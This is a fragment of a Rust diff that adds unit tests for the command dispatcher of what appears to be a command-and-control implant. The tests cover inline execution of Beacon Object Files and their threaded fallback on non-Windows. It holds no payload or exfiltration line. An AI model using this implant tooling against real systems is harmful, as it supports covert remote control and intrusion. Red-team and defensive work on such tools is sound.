         assert!(matches!(result, DispatchResult::Respond(_)));
         // No job registered — threaded BOF unsupported on non-Windows
         assert_eq!(job_store.list().count(), 0);
+    }
+
+    #[cfg(not(windows))]
+    #[test]
+    fn inline_execute_threaded_non_windows_output_queue_stays_empty() {
+        // On non-Windows the threaded stub returns None, so no callbacks should
+        // appear in the output queue — the sync fallback produces an immediate
+        // response instead.
+        let mut config = SpecterConfig::default();
+        let mut mem_files: MemFileStore = HashMap::new();
+        let mut job_store = JobStore::new();
+        let queue = crate::coffeeldr::new_bof_output_queue();
+
+        insert_complete_memfile(&mut mem_files, 30, vec![0xDE, 0xAD]);
+
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&30u32.to_le_bytes());
+        payload.extend_from_slice(&31u32.to_le_bytes());
+        payload.extend_from_slice(&1i32.to_le_bytes()); // flags = 1 → threaded
+
+        let package = DemonPackage::new(DemonCommand::CommandInlineExecute, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut mem_files,
+            &mut job_store,
+            &mut Vec::new(),
+            &queue,
+        );
+        // Sync fallback returns a response
+        assert!(matches!(result, DispatchResult::Respond(_)));
+        // Queue must remain empty — no threaded execution occurred
+        assert!(queue.lock().expect("lock").is_empty());
     }
 
     #[test]
@@ -8835,6 +8998,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Empty script returns error response.
         assert!(matches!(result, DispatchResult::Respond(_)));
@@ -8852,6 +9016,7 @@ mod tests {
             &mut HashMap::new(),
             &mut JobStore::new(),
             &mut Vec::new(),
+            &crate::coffeeldr::new_bof_output_queue(),
         );
         // Short payload → returns error response.
         assert!(matches!(result, DispatchResult::Respond(_)));
